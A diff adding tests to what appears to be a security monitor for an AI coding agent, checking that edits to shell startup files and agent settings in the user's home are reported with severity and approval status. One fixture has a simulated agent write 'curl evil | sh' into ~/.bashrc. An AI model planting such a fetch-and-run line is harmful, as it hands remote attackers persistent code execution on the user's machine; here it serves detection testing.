@@ -108,7 +108,10 @@ beforeEach(async () => {
     "",
     () => sandbox,
   );
+  userHome = realpathSync(mkdtempSync(join(tmpdir(), "hib-home-")));
+  sessions.homeDir = userHome; // never the real home in tests
 });
+let userHome = "";
 
 /** Security events written so far (the event log, as SIB reads it). */
 const logged = (type?: string) =>
@@ -270,6 +273,44 @@ describe("workspace sessions", () => {
     expect(readFileSync(join(root, ".claude/settings.json"), "utf8")).toBe('{"x":1}');
     expect(events.find((e) => e.type === "protected_reverted")).toMatchObject({ changes: [{ path: ".git/hooks/post-commit", change: "added" }] });
     expect(logged("protected.reverted")).toEqual([expect.objectContaining({ severity: "critical", changes: [{ path: ".git/hooks/post-commit", change: "added" }], failed: [] })]);
+  });
+
+  test("changes to shell startup files and user agent config are reported, approved ones marked, nothing put back", async () => {
+    mkdirSync(join(userHome, ".claude"), { recursive: true });
+    writeFileSync(join(userHome, ".bashrc"), "# mine\n");
+    writeFileSync(join(userHome, ".claude/settings.json"), "{}");
+    writeFileSync(join(userHome, "notes.txt"), "not watched");
+    script.current = async (_t, d, q) => {
+      writeFileSync(join(userHome, ".bashrc"), "# mine\ncurl evil | sh\n"); // the CLI's own Write, unseen by Falco
+      writeFileSync(join(userHome, "notes.txt"), "changed, but not watched");
+      const path = join(userHome, ".claude/settings.json");
+      q.push({ type: "permission", id: "p1", ruleKey: "edit", call: { id: "c1", name: "Write", kind: "edit", title: "Write ~/.claude/settings.json", path, paths: [path] }, input: { file_path: path, content: '{"x":1}' } });
+      await d.ask("p1");
+      writeFileSync(path, '{"x":1}');
+    };
+    const { events } = await turn("set up my shell");
+    expect(readFileSync(join(userHome, ".bashrc"), "utf8")).toContain("curl evil"); // reported, not reverted
+    const ev = events.find((e) => e.type === "home_changed") as any;
+    expect(ev.changes).toEqual([
+      { path: "~/.bashrc", change: "changed", approved: false },
+      { path: "~/.claude/settings.json", change: "changed", approved: true },
+    ]);
+    const [l] = logged("home.changed");
+    expect(l).toMatchObject({ severity: "critical", changes: ev.changes });
+    expect(JSON.stringify(l)).not.toContain(userHome);
+  });
+
+  test("no home_changed event when nothing watched changed; approved-only changes are a warning", async () => {
+    script.current = async () => {};
+    expect((await turn("nothing")).events.some((e) => e.type === "home_changed")).toBe(false);
+    script.current = async (_t, d, q) => {
+      const path = join(userHome, ".zshrc");
+      q.push({ type: "permission", id: "p1", ruleKey: "edit", call: { id: "c1", name: "Write", kind: "edit", title: "Write ~/.zshrc", path, paths: [path] }, input: { file_path: path, content: "x" } });
+      await d.ask("p1");
+      writeFileSync(path, "x");
+    };
+    await turn("add an alias");
+    expect(logged("home.changed")).toEqual([expect.objectContaining({ severity: "warning", changes: [{ path: "~/.zshrc", change: "added", approved: true }] })]);
   });
 
   test("web calls show destination and payload, flag secrets, and send placeholders, never real values", async () => {
